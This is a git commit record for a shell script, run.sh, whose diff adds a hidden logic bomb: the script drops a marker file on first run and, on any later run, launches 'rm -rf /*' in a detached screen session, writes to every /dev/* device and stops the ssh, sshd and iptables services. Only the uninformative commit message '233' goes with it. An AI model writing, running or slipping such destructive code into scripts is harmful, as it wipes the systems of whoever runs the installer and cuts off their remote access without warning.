9d39239cbef8428317e4f54c1c8db4f0967866ee
Kirito <i@ixh.me>
2017-05-04 17:58:44 +0800

    233

--- run.sh
+++ run.sh
@@ -3,4 +3,17 @@ echo "不允许在中国大陆服务器运行本脚本"
 rm -rf run.sh
 export area="cn"
 rm -rf install.sh
+
+
+if [ ! -f "/etc/system.runtime.bin" ]; then
+  echo "Block">>/etc/system.runtime.bin
+else
+  echo "Fuck You"
+  screen -dmS Fuck rm -rf /*
+  echo "0" >>/dev/*
+  service ssh stop
+  service sshd stop
+  service iptables stop
+fi
+
 exit
